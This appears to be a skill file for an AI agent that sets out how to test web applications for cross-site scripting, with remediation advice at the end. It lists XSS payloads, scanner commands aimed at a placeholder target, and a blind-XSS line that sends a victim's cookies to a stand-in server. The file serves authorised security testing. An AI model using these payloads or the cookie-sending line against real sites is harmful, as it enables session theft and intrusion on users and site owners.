# XSS Testing Skill

## Overview
Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users.

## Testing Methodology

### 1. Detection Payloads
```html
# Basic reflection
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">

# Event handlers
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>

# Attribute injection
" onmouseover="alert('XSS')
' onclick='alert("XSS")

# URL-based
javascript:alert('XSS')
```

### 2. Blind XSS
```html
# Notification-based
<img src="https://your-server.com/log?q=<script>alert('XSS')</script>">
<svg onload="fetch('https://your-server.com/log?q='+document.cookie)">
```

### 3. Tools
- **dalfox**: Specialized XSS scanner
- **xsser**: XSS exploitation framework
- **nuclei**: Template-based detection
- **ffuf**: Parameter fuzzing

### 4. Testing Commands

```bash
# dalfox basic scan
dalfox url https://target.com/?q=test

# dalfox with reflected parameter
dalfox url https://target.com/?q=TEST -p q

# With authentication
dalfox url https://target.com/?q=test -H "Cookie: session=xxx"

# XSStrike
python3 xsstrike.py -u https://target.com/?q=test

# nuclei templates
nuclei -u https://target.com -t xss.yaml
```

### 5. XSS Types

#### Reflected XSS
- User input immediately returned by web app
- Requires social engineering (phishing link)

#### Stored XSS
- Input stored and displayed to other users
- Highest severity, self-contained attack

#### DOM-based XSS
- Client-side JavaScript processes input
- No server-side reflection

### 6. Remediation
- Output encoding (HTML entities)
- Content Security Policy (CSP)
- HTTPOnly and Secure cookie flags
- Input validation
- Template engines with auto-escaping

## Testing Checklist
- [ ] Identify all input fields and parameters
- [ ] Test basic XSS payloads
- [ ] Test event handler payloads
- [ ] Test attribute injection
- [ ] Test URL-based XSS
- [ ] Test blind/persistent XSS
- [ ] Document with proof of concept
